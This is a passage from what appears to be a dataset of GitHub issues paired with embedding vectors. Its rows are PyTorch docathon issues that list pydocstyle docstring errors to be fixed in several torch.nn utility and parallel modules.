  0.10890131  0.2056126  -0.18088591 -0.07114407  0.18898062  0.3298605
 -0.20934953 -0.13525261 -0.07383463 -0.04194526  0.03186721  0.02192221
 -0.17356643  0.11596854 -0.3007452   0.06487827 -0.10843141 -0.14840429
 -0.08855899 -0.1251488   0.47578532 -0.06348678 -0.2197419   0.00486034
 -0.1370673  -0.03685653  0.03697726  0.24278623 -0.10920491  0.2681464
  0.35890746 -0.21103707 -0.18187779  0.13619938 -0.17110702 -0.255612
  0.2278173  -0.6134326   0.38797545  0.18570408  0.38819647  0.01198217
  0.32016426 -0.10364532  0.03675668 -0.13831347 -0.253369    0.232804
 -0.38232714  0.13661492  0.3141614  -0.1264399  -0.23711136 -0.14601582
 -0.46012816 -0.21144512 -0.12251378  0.1521081   0.28958705 -0.04131785
 -0.05067428  0.18166353  0.04804415  0.04515993  0.1706551   0.06898574
 -0.30613384 -0.0023109  -0.0800416   0.34834698  0.02213135  0.230008
  0.03704938  0.13849586  0.12371591 -0.08172792  0.2657683   0.31722325
 -0.3331343   0.2941143  -0.06260706  0.06715883  0.03602019  0.3984995
  0.15170273  0.1283483  -0.10418113 -0.33618134 -0.18329006  0.1822424
 -0.07468839  0.04503858 -0.42583615  0.09867159 -0.3210906  -0.14283592
  0.14115742  0.03212917 -0.09223085 -0.0876525  -0.10810906 -0.14277649
 -0.03345301  0.2256521  -0.09889616 -0.25650534 -0.06788851 -0.16257194
  0.1472992  -0.4841754  -0.14398834 -0.10809769  0.22479308  0.17827636
 -0.3723386  -0.25849324  0.5304588  -0.08388291 -0.33599982  0.11545588
 -0.1129119   0.34517792 -0.04291404  0.31019554 -0.17417473  0.33543175
 -0.541248   -0.07562652 -0.15896091 -0.16311726 -0.15141755 -0.31009907
 -0.07730069 -0.02530921  0.22850038 -0.11647399 -0.10717504  0.11827969
 -0.14563525  0.2927599   0.32964513  0.11307332  0.14852965  0.08293781
  0.02187298 -0.21832845 -0.36200386  0.25954998  0.199702   -0.01920902]"
"Fix docstring errors in parametrize.py, spectral_norm.py, stateless.py module: docs triaged docathon-h2-2023 easy","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `cached`, **Line**: 21, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `cached`, **Line**: 21, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `ParametrizationList`, **Line**: 70, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `ParametrizationList`, **Line**: 70, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `right_inverse`, **Line**: 201, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `right_inverse`, **Line**: 201, **Description**: First line should end with a period (not ')')
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `right_inverse`, **Line**: 201, **Description**: First line should be in imperative mood (perhaps 'Call', not 'Calls')
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `_inject_new_class`, **Line**: 280, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `register_parametrization`, **Line**: 381, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `is_parametrized`, **Line**: 587, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `remove_parametrizations`, **Line**: 609, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `remove_parametrizations`, **Line**: 609, **Description**: First line should be in imperative mood (perhaps 'Remove', not 'Removes')
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `type_before_parametrizations`, **Line**: 690, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `type_before_parametrizations`, **Line**: 690, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `type_before_parametrizations`, **Line**: 690, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `transfer_parametrizations_and_params`, **Line**: 704, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `transfer_parametrizations_and_params`, **Line**: 704, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/utils/spectral_norm.py`, **Entity**: ``, **Line**: 1, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/utils/spectral_norm.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not '7')
- **File**: `torch/nn/utils/spectral_norm.py`, **Entity**: `spectral_norm`, **Line**: 226, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/utils/spectral_norm.py`, **Entity**: `remove_spectral_norm`, **Line**: 287, **Description**: First line should be in imperative mood (perhaps 'Remove', not 'Removes')
- **File**: `torch/nn/utils/stateless.py`, **Entity**: `functional_call`, **Line**: 156, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/stateless.py`, **Entity**: `functional_call`, **Line**: 156, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/utils/stateless.py`, **Entity**: `functional_call`, **Line**: 156, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')

cc @carljparker",False,"[-0.21885455 -0.06735045 -0.08989617 -0.14355102  0.14911142 -0.09903003
 -0.00726694  0.10308868 -0.34291798  0.13005812  0.10960297  0.02478909
  0.13863096  0.2262398  -0.02841437  0.05840331 -0.2682022  -0.49058378
  0.08318192  0.00533728  0.31844485  0.46996266 -0.0761746   0.02116808
 -0.10218793  0.10067949 -0.42204475 -0.1753339   0.14482637  0.06702249
  0.2021828   0.17194979 -0.27994016  0.01247803  0.35957408  0.20780522
 -0.15478165 -0.08859726 -0.06559281  0.12263571 -0.04098239 -0.11820273
 -0.11728618  0.04815719  0.03892679 -0.1970075  -0.11734965  0.15115131
 -0.0132428   0.06531683 -0.04507127  0.14689936 -0.22298355 -0.00765449
  0.25165132 -0.02643335 -0.16233407  0.48435318 -0.01724734 -0.4028447
  0.16841412  0.22096011 -0.17193426 -0.00568571 -0.08776092  0.23496845
  0.0118722   0.15622023  0.32790673  0.30549362 -0.24492678  0.07935671
 -0.35386294 -0.08464308 -0.05815478  0.36544165 -0.4628504  -0.05904731
 -0.30407217 -0.30427036 -0.11607301  0.0034409   0.01874023  0.06444584
  0.06270203 -0.07696357  0.19033447 -0.07252789  0.30515546  0.14417088
  0.4231236  -0.17896408 -0.19643378  0.3601211   0.05737611  0.1928277
 -0.09323232  0.02374934  0.02012125 -0.04357064 -0.0234616  -0.42540196
 -0.25581616  0.23915553  0.10679561 -0.00872597  0.05119849  0.0985815
  0.21335468 -0.03677179  0.12889409 -0.09990737 -0.01727863  0.11660441
  0.29935622  0.00750353  0.01207937  0.05842181 -0.24303785 -0.00415133
  0.21579929  0.18043144  0.01352473  0.13667569  0.15042287  0.11791734
  0.28254843  0.00122853  0.2243546  -0.08062083  0.11812597 -0.06696858
 -0.15578851  0.20172876  0.25704163  0.05141276 -0.06253071 -0.032488
  0.11594335  0.03429963 -0.22822204 -0.44464743 -0.14317828 -0.21397218
  0.30596912  0.17769122 -0.44630307  0.22977641  0.04893576  0.17854813
 -0.04396437 -0.02137222 -0.39973363  0.36306548 -0.02212726  0.05254673
  0.34416604  0.07910575  0.00855595 -0.24583004 -0.04246204  0.03543556
 -0.00143775  0.00482015 -0.04785908  0.16289315 -0.1572397  -0.23957273
 -0.41175142 -0.23507753  0.06318169  0.0449227  -0.02498516 -0.04283348
  0.21865287  0.07226005 -0.15786235 -0.3064865  -0.04044584  0.3229254
  0.09340917  0.44690955  0.1228039   0.064217   -0.20189443  0.11047605
  0.2588107  -0.08386861  0.14484671  0.24807997 -0.01418763 -0.35685143
  0.06980492 -0.04593597 -0.16543943 -0.1436519   0.26043007  0.30946106
  0.04100831  0.33089304 -0.28956637  0.18750931  0.3982305  -0.09402047
  0.5413575  -0.06310036 -0.4164239  -0.29110983 -0.31592512  0.27531856
 -0.28351164 -0.10689662  0.06300078 -0.25979608 -0.1386084   0.27997106
 -0.04207779 -0.39853013  0.15566573 -0.05076461 -0.22453865 -0.08210041
 -0.14765906 -0.28198147  0.3277731   0.12598594 -0.11205515 -0.1245095
 -0.02088753 -0.08920415  0.01100693 -0.02361052  0.4510593  -0.21618295
  0.17161323  0.25899732 -0.12507099 -0.11662015  0.18933508  0.3086189
 -0.3358329  -0.15393864 -0.02455999  0.01195537  0.02821091 -0.06635532
 -0.2324504   0.00759876 -0.37647736  0.07879694 -0.10053112 -0.26378718
 -0.05264517 -0.11375818  0.48661542  0.03795232 -0.21477608 -0.05214628
 -0.13147655  0.06709137 -0.02328837  0.16150774 -0.06973717  0.31928366
  0.25047776 -0.14689144 -0.26912394  0.17497219 -0.20493668 -0.22425914
  0.16660157 -0.5239376   0.3429689   0.10433671  0.34675395  0.09285396
  0.31068778 -0.09710647  0.0309736  -0.14127442 -0.19298288  0.38835573
 -0.36347345  0.06613079  0.28957558 -0.05686263 -0.2968079  -0.07207401
 -0.34655958 -0.1696102  -0.15603389  0.22392255  0.39070094 -0.06187738
 -0.02531488  0.15990981 -0.07002217  0.03703632  0.3245327   0.08816473
 -0.3490969   0.03104074 -0.04262014  0.37681904  0.01182656  0.22446272
  0.15199056  0.04875356  0.197336   -0.1733895   0.37293696  0.28305593
 -0.28549078  0.34941113 -0.05285543  0.03854615  0.032517    0.47128695
  0.21854159  0.1354799  -0.14311104 -0.3174167  -0.14810884  0.05065387
  0.05963987  0.05991878 -0.34769905 -0.01421532 -0.29771215 -0.23694482
  0.20218171 -0.06636229 -0.18165311 -0.15503141 -0.04083151  0.00145025
 -0.14911821  0.2371249  -0.08163851 -0.17202768 -0.08404702 -0.12659954
  0.09974664 -0.56665325 -0.1318564  -0.02722702  0.16369414  0.08933102
 -0.3295652  -0.20698676  0.46981013 -0.10310972 -0.2581802   0.10213118
 -0.19569525  0.43850988 -0.04250452  0.2377935  -0.23805252  0.37973917
 -0.549572    0.0355235  -0.16499051 -0.24211222 -0.15968409 -0.32041687
  0.03144821 -0.08777914  0.16476724 -0.06335456 -0.20699152  0.13173938
 -0.21902233  0.23831531  0.2903328   0.08257405  0.15430328  0.09070576
 -0.03511758 -0.30884832 -0.3485467   0.3534397   0.21146879 -0.0781711 ]"
"Fix docstring errors in memory_format.py, init.py, _named_member_accessor.py, _per_sample_grad.py, distributed.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_cast_buffers`, **Line**: 92, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_setup_mixed_precision_params`, **Line**: 103, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_setup_mixed_precision_params`, **Line**: 103, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_find_tensors`, **Line**: 143, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `__init__`, **Line**: 273, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `__init__`, **Line**: 273, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `main_hook`, **Line**: 287, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `main_hook`, **Line**: 287, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `post_hook`, **Line**: 324, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `post_hook`, **Line**: 324, **Description**: First line should end with a period (not 'l')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `post_hook`, **Line**: 324, **Description**: First line should be in imperative mood (perhaps 'Sync', not 'Syncs')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `DistributedDataParallel`, **Line**: 332, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `DistributedDataParallel`, **Line**: 332, **Description**: First line should end with a period (not 'n')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_fire_reducer_autograd_hook`, **Line**: 958, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_fire_reducer_autograd_hook`, **Line**: 958, **Description**: First line should be in imperative mood (perhaps 'Fire', not 'Fires')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_root_copy_hook`, **Line**: 967, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_root_copy_hook`, **Line**: 967, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_module_wait_for_copy_hook`, **Line**: 1010, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_module_wait_for_copy_hook`, **Line**: 1010, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_ddp_init_helper`, **Line**: 1048, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_ddp_init_helper`, **Line**: 1048, **Description**: First line should end with a period (not '
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_ddp_init_helper`, **Line**: 1048, **Description**: First line should be in imperative mood (perhaps 'Initialize', not 'Initialization')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_assign_modules_buffers`, **Line**: 1220, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_assign_modules_buffers`, **Line**: 1220, **Description**: First line should end with a period (not 'o')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_assign_modules_buffers`, **Line**: 1220, **Description**: First line should be in imperative mood (perhaps 'Assign', not 'Assigns')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_get_parameters`, **Line**: 1278, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_get_parameters`, **Line**: 1278, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_get_parameters`, **Line**: 1278, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `no_sync`, **Line**: 1313, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `no_sync`, **Line**: 1313, **Description**: First line should end with a period (not 'P')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `no_sync`, **Line**: 1313, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_get_active_ddp_module`, **Line**: 1341, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_get_active_ddp_module`, **Line**: 1341, **Description**: First word of the first line should be properly capitalized ('Torchdynamo', not 'TorchDynamo')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `join`, **Line**: 1609, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `join`, **Line**: 1609, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `join`, **Line**: 1609, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `join_hook`, **Line**: 1715, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `join_hook`, **Line**: 1715, **Description**: First line should end with a period (not 'y')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `join_hook`, **Line**: 1715, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_register_buffer_comm_hook`, **Line**: 1757, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_register_buffer_comm_hook`, **Line**: 1757, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_register_buffer_comm_hook`, **Line**: 1757, **Description**: First line should be in imperative mood (perhaps 'Allow', not 'Allows')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `register_comm_hook`, **Line**: 1797, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `register_comm_hook`, **Line**: 1797, **Description**: First line should end with a period (not 'a')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `register_comm_hook`, **Line**: 1797, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_register_builtin_comm_hook`, **Line**: 1879, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_register_builtin_comm_hook`, **Line**: 1879, **Description**: First line should end with a period (not 'P')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_register_builtin_comm_hook`, **Line**: 1879, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_register_fused_optim`, **Line**: 1906, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_register_fused_optim`, **Line**: 1906, **Description**: First line should end with a period (not 'a')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_register_fused_optim`, **Line**: 1906, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_default_broadcast_coalesced`, **Line**: 2052, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_default_broadcast_coalesced`, **Line**: 2052, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_get_data_parallel_params`, **Line**: 2120, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_get_data_parallel_params`, **Line**: 2120, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_set_params_and_buffers_to_ignore_for_model`, **Line**: 2133, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_set_params_and_buffers_to_ignore_for_model`, **Line**: 2133, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_set_params_and_buffers_to_ignore_for_model`, **Line**: 2133, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_get_ddp_logging_data`, **Line**: 2162, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_get_ddp_logging_data`, **Line**: 2162, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_get_ddp_logging_data`, **Line**: 2162, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_set_ddp_runtime_logging_sample_rate`, **Line**: 2176, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_set_ddp_runtime_logging_sample_rate`, **Line**: 2176, **Description**: First line should end with a period (not 'g')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_set_ddp_runtime_logging_sample_rate`, **Line**: 2176, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_set_static_graph`, **Line**: 2194, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_set_static_graph`, **Line**: 2194, **Description**: First line should end with a period (not 'l')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_set_static_graph`, **Line**: 2194, **Description**: First line should be in imperative mood; try rephrasing (found 'It')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_remove_autograd_hooks`, **Line**: 2219, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_remove_autograd_hooks`, **Line**: 2219, **Description**: First line should be in imperative mood (perhaps 'Remove', not 'Removes')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_check_reducer_finalized`, **Line**: 2225, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_check_reducer_finalized`, **Line**: 2225, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_check_reducer_finalized`, **Line**: 2225, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `NamedMemberAccessor`, **Line**: 109, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `NamedMemberAccessor`, **Line**: 109, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `get_submodule`, **Line**: 122, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `swap_submodule`, **Line**: 155, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `get_tensor`, **Line**: 164, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `set_tensor`, **Line**: 185, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `del_tensor`, **Line**: 194, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `swap_tensor`, **Line**: 211, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `get_tensors`, **Line**: 224, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `set_tensors`, **Line**: 233, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `set_tensors_dict`, **Line**: 249, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `del_tensors`, **Line**: 261, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `swap_tensors`, **Line**: 276, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `swap_tensors_dict`, **Line**: 296, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `check_keys`, **Line**: 327, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `named_parameters`, **Line**: 342, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `named_buffers`, **Line**: 351, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `named_tensors`, **Line**: 360, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/utils/_named_member_accessor.py`, **Entity**: `named_modules`, **Line**: 370, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/utils/_per_sample_grad.py`, **Entity**: `call_for_per_sample_grads`, **Line**: 12, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_per_sample_grad.py`, **Entity**: `call_for_per_sample_grads`, **Line**: 12, **Description**: First line should end with a period (not ')')
- **File**: `torch/nn/utils/_per_sample_grad.py`, **Entity**: `call_for_per_sample_grads`, **Line**: 12, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/utils/init.py`, **Entity**: `skip_init`, **Line**: 6, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/init.py`, **Entity**: `skip_init`, **Line**: 6, **Description**: First line should end with a period (not 'g')
- **File**: `torch/nn/utils/memory_format.py`, **Entity**: `convert_conv2d_weight_memory_format`, **Line**: 5, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/utils/memory_format.py`, **Entity**: `convert_conv2d_weight_memory_format`, **Line**: 5, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/memory_format.py`, **Entity**: `convert_conv2d_weight_memory_format`, **Line**: 5, **Description**: First line should end with a period (not '`')

cc @carljparker",False,"[-0.13825305 -0.270532   -0.04215072 -0.17893791  0.19116573 -0.09018515
 -0.06102788  0.14655828 -0.27397454  0.04836856  0.01421175  0.04604786
  0.15637675  0.20271158  0.00939811 -0.00191364 -0.29856473 -0.50922036
  0.31515017  0.10431741  0.18434519  0.42835662 -0.07190662 -0.05075705
 -0.16266118  0.07895014 -0.3098545  -0.17344597  0.01003825  0.08866489
  0.3774885   0.17518584 -0.21112943 -0.00472261  0.42340544  0.35641104
 -0.1723508  -0.23689047  0.03671403  0.17838219 -0.00765983 -0.16478744
 -0.13837573  0.04144897  0.10001411 -0.14068566 -0.14118129  0.21760622
 -0.11806813  0.06205781 -0.03753412  0.17059529 -0.14378807  0.08019777
  0.22294211 -0.01444355 -0.11092794  0.53349364 -0.08263607 -0.1136793
 -0.0111657   0.27864107 -0.10887466  0.1162671  -0.1227011   0.32371494
  0.08405174  0.14640608  0.3615201  -0.11388402 -0.158945    0.17801747
 -0.3872679  -0.18929     0.01222829  0.3868956  -0.45160347 -0.01130668
 -0.26691282 -0.34794497 -0.13252847  0.11373935  0.00170318  0.1307931
 -0.00517266 -0.1454542   0.2479959  -0.13967896  0.27365443  0.16424993
  0.39209569 -0.26057756 -0.0141459   0.37735093  0.12104139  0.33174512
 -0.11898127 -0.09985625  0.06101885 -0.15731262  0.07648264 -0.30652887
 -0.16950244  0.15563554  0.03617448 -0.06925389  0.16959108  0.01535771
  0.20225362 -0.05028348 -0.04866317 -0.1343489   0.17478405  0.21045542
  0.35346663  0.08325066 -0.23207045  0.07074552 -0.3222376  -0.03900879
  0.22452086  0.22590637 -0.05516903 -0.01821622 -0.00088979  0.06093556
  0.22841713 -0.01068232  0.03694239 -0.24330348  0.20381764 -0.01596121
 -0.13622952  0.08594818  0.22070116  0.16610506 -0.10865645 -0.38469923
 -0.03873109 -0.0793615  -0.20705302 -0.3572507  -0.23406409 -0.17962882
  0.09726664  0.40570444 -0.2540152   0.44546217  0.00292554  0.17489102
 -0.00074336  0.05257557 -0.32103676  0.45162255 -0.05776596  0.02734703
  0.55163383  0.07686598 -0.03903129 -0.24634671 -0.0276225   0.1185403
 -0.03043318  0.03742669 -0.17406055  0.17334837 -0.16384403 -0.20210755
 -0.27051342 -0.23710516 -0.01527284  0.21071517 -0.05752106 -0.2246319
  0.17431411  0.05517648 -0.09401689 -0.26386243  0.01339428  0.20463479
 -0.01286618  0.53514767  0.08078508  0.06127033 -0.19377664  0.0876613
  0.19132255 -0.18129861  0.24247861  0.3728363   0.04337313 -0.1292489
  0.20809904 -0.02602392 -0.14258711 -0.15447733  0.35687286  0.52129716
  0.05231819  0.25565535 -0.2532704   0.24513607  0.24078768 -0.08743761
  0.45098758 -0.06217148 -0.36211884 -0.19643405 -0.13947421 -0.04801112
 -0.28669718 -0.14787883 -0.07561816 -0.21750253 -0.29398257  0.31657353
  0.04095963 -0.29956102  0.39951134 -0.19208196 -0.4478177  -0.04123302
 -0.17919487 -0.31224447  0.28508714  0.1473817  -0.00655916 -0.10849214
  0.05611238 -0.0073999   0.00219236  0.06448706  0.5644778  -0.1687974
  0.1428066   0.05750886 -0.09056024 -0.02343113  0.19057024  0.25753736
 -0.1568459  -0.07295378 -0.09247647  0.00627945  0.08154999 -0.15608142
 -0.16188928 -0.05853936 -0.28566736  0.13015968 -0.06440273 -0.3008591
  0.13648543 -0.0493859   0.6648201   0.0194142  -0.3830129  -0.01033904
 -0.04921319 -0.01745516 -0.08400021  0.26560268 -0.09000189  0.1565961
  0.34770942 -0.21879727 -0.24354324  0.14230356 -0.01376528 -0.17059614
  0.15251231 -0.5853554   0.5394573   0.24519747  0.3457903   0.0868606
  0.35740787 -0.10764433  0.14489219 -0.02077804 -0.17147435  0.42236254
 -0.3753365  -0.14656374  0.27959093 -0.02814786 -0.14017522 -0.22639121
